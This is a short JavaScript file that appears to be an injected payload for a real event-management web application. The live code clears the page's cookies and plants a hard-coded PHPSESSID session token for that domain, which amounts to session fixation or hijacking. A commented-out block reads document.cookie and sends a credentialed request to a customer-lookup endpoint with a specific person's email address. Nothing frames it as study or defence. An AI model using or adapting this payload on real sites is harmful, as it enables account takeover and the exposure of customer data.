// (function () {
//   alert("foi", window.location.origin);
//   console.log(window.location.origin);
//   const asdf = document.getElementById("formdoc");

//   const btn = document.createElement("div");

//   btn.innerText = "asdf";
//   btn.onclick = () => {
//     console.log(document.cookie);
//   };

//   asdf.appendChild(btn);
//   async function fetchData() {
//     await fetch(
//       "https://app6.meeventos.com.br/fumagallyeventos/index.php?p=visualizar&pagina=consultacadastrocliente",
//       {
//         credentials: "include",
//         headers: {
//           Accept: "*/*",
//           "Accept-Language": "en-US,en;q=0.5",
//           "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
//           "X-Requested-With": "XMLHttpRequest",
//           "Sec-Fetch-Dest": "empty",
//           "Sec-Fetch-Mode": "cors",
//           "Sec-Fetch-Site": "same-origin",
//           Priority: "u=0",
//         },
//         referrer:
//           "https://app6.meeventos.com.br/fumagallyeventos/index.php?p=orcamento&acao=novo",
//         body: "email=eternopupilo%40gmail.com",
//         method: "POST",
//         mode: "cors",
//       }
//     );
//   }
// })();

(function () {
  alert("foi", window.location.origin);
  console.log(window.location.origin);
  const asdf = document.getElementById("formdoc");
  document.cookie = "";
  document.cookie =
    "PHPSESSID=509861694ab26b846caed0335d9dfef1; user_language=pt_BR; path=/; domain=app6.meeventos.com.br; secure=false; samesite=None";
  const btn = document.createElement("div");

  btn.innerText = "asdf";
  btn.onclick = () => {
    document.cookie =
      "PHPSESSID=509861694ab26b846caed0335d9dfef1; user_language=pt_BR; path=/; domain=app6.meeventos.com.br; secure=false; samesite=None";
    console.log(document.cookie);
  };

  asdf.appendChild(btn);
})();
